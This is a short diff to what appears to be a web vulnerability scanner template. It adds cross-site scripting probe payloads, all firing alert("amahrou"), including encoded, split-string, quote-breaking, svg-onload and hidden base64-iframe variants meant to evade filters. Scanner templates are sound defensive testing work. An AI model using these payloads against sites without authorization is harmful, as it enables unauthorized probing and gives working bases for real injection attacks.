@@ -26,6 +26,16 @@ http:
         - '<script>alert("amahrou")</script>'
         - '"><img src=x onerror=alert("amahrou")>'
         - '<script>window.alert("amahrou");</script>'
+        - '"><s%63ript>alert("amahrou")</s%63ript>'
+        - 'javascrip&#116;:alert("amahrou")'
+        - 'javascript:alert("amahrou")'
+        - '<img src=x onerror=alert("amahrou")>'
+        - '");alert("amahrou");//'
+        - 'java"+"script:alert("amahrou")'
+        - '<svg/onload=alert("amahrou")>'
+        - '";alert("amahrou");//'
+        - 'location.href=\"javascript:alert("amahrou")\"'
+        - '<iframe src="data:text/html;base64,PHNjcmlwdD5hbWFocm91PC9zY3JpcHQ+" height="0" width="0"></iframe>'
 
   
     fuzzing:
